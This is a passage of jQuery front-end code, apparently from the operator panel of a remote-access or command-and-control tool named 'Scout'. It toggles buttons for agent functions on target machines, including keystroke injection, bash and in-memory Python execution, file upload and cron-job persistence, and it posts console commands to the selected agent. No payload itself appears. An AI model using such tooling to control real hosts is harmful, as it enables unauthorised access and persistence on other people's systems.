                $("#button_direct_classify_lin_write_injectKeystrokes").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_write_injectKeystrokes").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("linux/control/set_audio", l) > -1) {
                $("#button_direct_classify_lin_write_setAudio").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_write_setAudio").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("linux/control/upload_file", l) > -1) {
                $("#button_direct_classify_lin_write_uploadFile").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_write_uploadFile").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/execute_command_bash", l) > -1) {
                $("#button_direct_classify_lin_execute_bash").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_execute_bash").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 48% !important;")
            }

            if (jQuery.inArray("linux/control/execute_python", l) > -1) {
                $("#button_direct_classify_lin_execute_python").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_execute_python").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 48% !important;")
            }

            if (jQuery.inArray("linux/control/cron_job_persistence", l) > -1) {
                $("#button_direct_classify_lin_persist_cronJobPersistence").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_persist_cronJobPersistence").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 55% !important;")
            }
        }
    }

    // Color background of chosen tab
    function displaySelectedFunctions(mainSelection) {
        if (ScoutGlobals.scoutOS === "win") {
            if (mainSelection !== "") {
                if (mainSelection === "read") {
                    $(".br_direct_classify_win_read_break").show();
                    $(".br_direct_classify_win_write_break").hide();
                } else if (mainSelection === "write") {
                    $(".br_direct_classify_win_write_break").show();
                    $(".br_direct_classify_win_read_break").hide();
                } else {
                    $(".br_direct_classify_win_write_break").hide();
                    $(".br_direct_classify_win_read_break").hide();
                }
                $("#div_direct_classify_win").show();
                $("#div_direct_classify_win_main_buttons").show();
                $(".button_direct_classify_win_main").css("background-color", "#2f3136");
                $("#button_direct_classify_win_main_" + mainSelection).css("background-color", "#42444a");
                $(".classify_win_buttons").hide();
                $(".div_direct_classify_win_" + mainSelection + "_buttons").show();
            } else {
                $("#div_direct_classify_win").hide();
            }
        } else if (ScoutGlobals.scoutOS === "lin") {
            if (mainSelection !== "") {
                if (mainSelection === "read") {
                    $(".br_direct_classify_lin_read_break").show();
                } else {
                    $(".br_direct_classify_lin_read_break").hide();
                }
                $("#div_direct_classify_lin").show();
                $("#div_direct_classify_lin_main_buttons").show();
                $(".button_direct_classify_lin_main").css("background-color", "#2f3136");
                $("#button_direct_classify_lin_main_" + mainSelection).css("background-color", "#42444a");
                $(".classify_lin_buttons").hide();
                $(".div_direct_classify_lin_" + mainSelection + "_buttons").show();
            } else {
                $("#div_direct_classify_win").hide();
            }
        }
    }

    // Main function to log to console
    function logToConsole(t, newline, input=false, help=false) {
        let $selector = $("#p_console_output");
        if (!input) {
            let appendString;
            appendString = t.toString()
                .replace(/ /g, "\u00A0")
                .replace(/\u00A0</g, "\u00A0&lt;")
                .replace(/\u00A0>/g, "\u00A0&gt;")
                .replace(/<\u00A0/g, "&lt;\u00A0")
                .replace(/>\u00A0/g, "&gt;\u00A0")
                .replace(/-/g, "&#8209;")
                .replace(/\[\+\]/g, "<p1 style='color: #13a10e'>[+]</p1>")
                .replace(/\[\*\]/g, "<p1 style='color: #3b78ff'>[*]</p1>")
                .replace(/\[\&#8209;\]/g, "<p1 style='color: #e74856'>[-]</p1>")
                .replace(/\[\!\]/g, "<p1 style='color: #f9f1a5'>[!]</p1>")
                .replace(/\[\>\]/g, "<p1 style='color: #b4009e'>[>]</p1>");
            if (help) {
                appendString = appendString
                    .replace("exec_py_script", "<p1 style='color: #e74856'>exec_py_script</p1>")
                    .replace("Script\u00A0in\u00A0the\u00A0terminal\u00A0a\u00A0block\u00A0of\u00A0in&#8209;memory\u00A0arbitrary\u00A0python\u00A0code\u00A0to\u00A0execute\u00A0on\u00A0the\u00A0target\u00A0system","<p1 style='color: #e74856'>Function\u00A0not\u00A0supported\u00A0in\u00A0web\u00A0command\u00A0line.\u00A0Please\u00A0use\u00A0execute\u00A0python\u00A0to\u00A0script\u00A0a\u00A0program</p1>");
            }
            appendString = String.raw`${appendString}`;
            appendString = appendString.replace(/\n/g, "<br>");
            $selector.append(appendString);
            if (newline) {
                $selector.append("<br>");
            }
            $selector.scrollTop($selector[0].scrollHeight);
        } else {
            let index = $(".input_console_command").length;
            if (index) {
                $("#input_console_command_" + String(index - 1)).attr("readonly", true);
                logToConsole("[>]", false);
                $selector.append("<input type='text' style='height: auto !important; background-color: #252629 !important; font-size: inherit !important; color: #bfbfbb !important;' id='input_console_command_" + String(index) + "' class='input_console_command'><br>");
            } else {
                logToConsole("[>]", false);
                $selector.append("<input type='text' style='height: auto !important; background-color: #252629 !important; font-size: inherit !important; color: #bfbfbb !important;' id='input_console_command_0' class='input_console_command'><br>");
            }
            $("#input_console_command_" + String(index)).focus();
        }
    }

    // Show chosen function's content
    function displayComponents(component) {
        if (ScoutGlobals.scoutOS === "win") {
            $(".div_component_win").hide();
            $("#div_direct_components_win_" + component).show();
        } else if (ScoutGlobals.scoutOS === "lin") {
            $(".div_component_lin").hide();
            $("#div_direct_components_lin_" + component).show();
        }
    }


    // GLOBAL FUNCTIONS !!

    // Error message stuff
    function showMessage(msg){
        let elmt;
        if (ScoutGlobals.error) {
            elmt = document.getElementById("error");
        } else {
            elmt = document.getElementById("success");
        }
        elmt.innerHTML = esc(msg) + "<a onclick='closeMessage()' id='closeError'>x</a>";
        elmt.classList.remove('hide');
        elmt.classList.add('show');
    }
    function esc(str) {
        if(str){
            return str.toString()
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/\"/g, '&quot;')
                .replace(/\'/g, '&#39;')
                .replace(/\//g, '&#x2F;');
        }
        return "";
    }
    function scrollToTop() {
        document.body.scrollTop = 0; // For Safari
        document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
    }

    // AJAX Triggers
    function triggerAjax (data, async, url, callback, extra_input){
        $.ajax({
            data: {
                command: data
            },
            type: 'POST',
            async: async,
            url: url,
            success: function (recvData) {
                if (extra_input !== undefined) {
                    callback(recvData, extra_input);
                }
                else {
                    callback(recvData);
                }
            }
        });
    }
    function triggerAjaxDirectInterface(data, async, callback, extra_input) {
        $.ajax({
            data: {
                command: data,
                scoutId: ScoutGlobals.bridgedId
            },
            type: 'POST',
            async: async,
            url: '/direct_process',
            success: function (recvData) {
                if (extra_input !== undefined) {
                    callback(recvData, extra_input);
                }
                else {
                    callback(recvData);
                }
            }
        });
    }

});

// Make Scout Table Selectable
function tableRowClickable(clickable){
        if(clickable) {
            $("#table_scouts tr").not(":first").each(function() {
                $(this).addClass('clickable');
            })
        }
        else {
            $("#table_scouts tr").not(":first").each(function() {
                $(this).removeClass('clickable');
            })
        }
    }

// Close message
function closeMessage(){
    let elmt;
    if (ScoutGlobals.error) {
        elmt = document.getElementById("error");
    } else {
        elmt = document.getElementById("success");
    }
    elmt.innerHTML = "";
    elmt.classList.remove('show');
    elmt.classList.add('hide');
}